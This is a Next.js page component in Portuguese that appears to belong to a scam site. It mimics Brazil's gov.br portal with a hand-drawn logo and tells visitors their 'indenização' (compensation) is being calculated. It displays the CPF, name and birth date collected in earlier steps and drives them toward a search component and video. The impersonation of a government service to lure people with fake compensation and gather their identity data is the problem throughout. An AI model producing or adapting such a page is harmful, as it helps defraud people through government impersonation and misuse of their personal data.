import User from '@/assets/imgs/7.webp'
import Document from '@/assets/imgs/9.webp'
import Calendary from '@/assets/imgs/13.webp'
import Username from '@/assets/imgs/14.webp'
import { env } from '@/lib/env'
import httpFetch from '@/lib/http-fetch'
import type { ResponseData, ResponseError } from '@/schemas/search-cpf'
import type { Metadata } from 'next'
import { cookies } from 'next/headers'
import Image from 'next/image'
import { redirect } from 'next/navigation'
import { LoaderComponent } from './_components/loader'
import Player from './_components/player'
import { SearchComponent } from './_components/search'

export const metadata: Metadata = {
  title: 'Verificação dos dados',
}

export default async function VerificationPage() {
  const cookieStore = await cookies()
  const cpf = cookieStore.get('cpfFormated')?.value
  const name = cookieStore.get('name')?.value
  const nascimento = cookieStore.get('nascimento')?.value

  if (!cpf) {
    redirect('/')
  }

  if (!name) {
    redirect('/')
  }

  return (
    <div className="w-full bg-[#1351B4] min-h-screen space-y-4">
      <div className="sticky bg-white top-0 h-[62px] border-b border-white/90 shadow-xl  w-full flex items-center px-8">
        <svg width="120" height="40" viewBox="0 0 120 40">
          <title>GOV.BR</title>
          <text x="0" y="30" className="text-4xl" letterSpacing="-2">
            <tspan fill="#2864AE" className="font-black">
              g
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              o
            </tspan>
            <tspan fill="#27AE60" className="font-black">
              v
            </tspan>
            <tspan fill="#2864AE" className="font-black">
              .b
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              r
            </tspan>
          </text>
        </svg>
      </div>
      <div className="p-5">
        <div className="border text-card-foreground shadow-sm w-full max-w-[600px] p-6 rounded-2xl bg-white mt-5 flex flex-col space-y-6">
          <div className="space-y-1">
            <p className="text-base text-gray-900 text-center font-medium">
              Atenção, o cálculo da sua indenização está sendo realizada, isso
              pode levar alguns minutos!
            </p>

            <p className="text-base text-gray-900 text-center font-medium">
              Veja o vídeo abaixo
            </p>
          </div>

          <LoaderComponent />

          <div>
            <Player />
          </div>

          <div className="space-y-4 text-gray-900">
            <h2 className="text-sm font-bold">
              Dados verificados com sucesso!
            </h2>
            <div className="space-y-2">
              <div className="flex items-center gap-3">
                <Image
                  src={Username}
                  alt=""
                  width="24"
                  height="24"
                  className="size-5"
                />
                <div>
                  <p>{name}</p>
                </div>
              </div>

              <div className="flex items-center gap-3">
                <Image
                  src={Calendary}
                  alt=""
                  width="24"
                  height="24"
                  className="size-5"
                />
                <div>
                  <p>{nascimento?.split(" ")[0]?.split("-").reverse().join("/")}</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <Image
                  src={Document}
                  alt=""
                  width="24"
                  height="24"
                  className="size-5"
                />
                <div>
                  <p>{cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
                </div>
              </div>
              
              <SearchComponent cpf={cpf.replace(/[.\-]/g, '')} />
            </div>
          </div>

          <p className="text-center text-xs font-medium text-[#1351B4]">
            Termos de Uso e Aviso de Privacidade
          </p>
        </div>
      </div>
    </div>
  )
}
